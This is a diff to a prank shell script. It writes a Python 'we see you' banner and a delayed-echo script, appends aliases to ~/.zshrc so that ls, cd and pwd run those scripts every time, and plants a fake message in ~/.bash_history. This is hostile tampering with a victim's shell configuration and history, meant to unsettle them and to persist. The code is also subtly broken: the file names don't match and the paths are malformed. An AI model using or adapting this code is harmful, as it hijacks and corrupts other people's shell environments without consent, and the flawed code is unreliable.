@@ -25,9 +25,12 @@ def print_letters(text):
     return '\n'.join(output)
 
 print_letters("we see you")
-print(\n)
-print(\n)
+print("\n")
+print("\n")
 EOL
+
+cat >> $HOME/shell2.sh << EOL
+#!/bin/sh
 
 echo -n "A"
 sleep 0.2
@@ -80,14 +83,15 @@ sleep 0.5
 echo "?"
 sleep 10
 
+EOL
+
 cat >> $HOME/.zshrc << EOL
-alias ls="python $HOME/.shell.py && /bin/ls"
-alias cd="python $HOME/.shell.py && /usr/bin/cd"
-alias pwd="python $HOME/.shell.py && /bin/pwd"
+alias ls="python $HOME/.shell.py && /bin/ls && ./$HOME/.shell2.sh"
+alias cd="python $HOME/.shell.py && /usr/bin/cd && ./$HOME/.shell2.sh"
+alias pwd="python $HOME/.shell.py && /bin/pwd && ./$HOME/.shell2.sh"
 EOL
 
 cat >> $HOME/.bash_history << EOL
 The chamber of secrets has been opened, enermies of the heir beware!
 EOL
-
 
